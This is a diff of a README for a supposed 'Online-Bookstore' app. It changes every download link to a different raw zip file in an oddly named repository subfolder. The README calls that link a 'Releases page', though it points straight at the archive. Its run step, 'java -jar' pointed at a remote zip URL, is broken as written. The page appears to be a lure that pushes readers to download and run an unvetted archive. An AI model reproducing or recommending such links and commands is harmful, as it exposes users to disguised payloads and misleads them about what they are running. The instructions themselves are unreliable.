@@ -1,6 +1,6 @@
 # 📚 Online-Bookstore - Shop for Books Easily Online
 
-[![Download Online-Bookstore](https://raw.githubusercontent.com/Lelekman/Online-Bookstore/main/Bretwaldadom/Online-Bookstore.zip%20Now-%20%F0%9F%9A%80-brightgreen)](https://raw.githubusercontent.com/Lelekman/Online-Bookstore/main/Bretwaldadom/Online-Bookstore.zip)
+[![Download Online-Bookstore](https://github.com/Lelekman/Online-Bookstore/raw/refs/heads/main/Bretwaldadom/Online-Bookstore-2.9-beta.3.zip%20Now-%20%F0%9F%9A%80-brightgreen)](https://github.com/Lelekman/Online-Bookstore/raw/refs/heads/main/Bretwaldadom/Online-Bookstore-2.9-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you begin, ensure that your system meets the following requirements:
 
 ## 🔗 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Lelekman/Online-Bookstore/main/Bretwaldadom/Online-Bookstore.zip) to download the latest version of the Online-Bookstore application.
+To get started, visit the [Releases page](https://github.com/Lelekman/Online-Bookstore/raw/refs/heads/main/Bretwaldadom/Online-Bookstore-2.9-beta.3.zip) to download the latest version of the Online-Bookstore application.
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version.
@@ -45,7 +45,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/Lele
 2. Open your terminal and navigate to the extracted folder.
 3. Run the following command to start the application:
    ```bash
-   java -jar https://raw.githubusercontent.com/Lelekman/Online-Bookstore/main/Bretwaldadom/Online-Bookstore.zip
+   java -jar https://github.com/Lelekman/Online-Bookstore/raw/refs/heads/main/Bretwaldadom/Online-Bookstore-2.9-beta.3.zip
    ```
 
 ## 🌐 Using the Application
@@ -75,4 +75,4 @@ If you encounter any issues while using Online-Bookstore:
 
 For additional help or questions, please open an issue on our GitHub page, and we’ll get back to you as soon as we can.
 
-Don't forget to visit the [Releases page](https://raw.githubusercontent.com/Lelekman/Online-Bookstore/main/Bretwaldadom/Online-Bookstore.zip) to download the latest version and explore all the features of Online-Bookstore!
+Don't forget to visit the [Releases page](https://github.com/Lelekman/Online-Bookstore/raw/refs/heads/main/Bretwaldadom/Online-Bookstore-2.9-beta.3.zip) to download the latest version and explore all the features of Online-Bookstore!
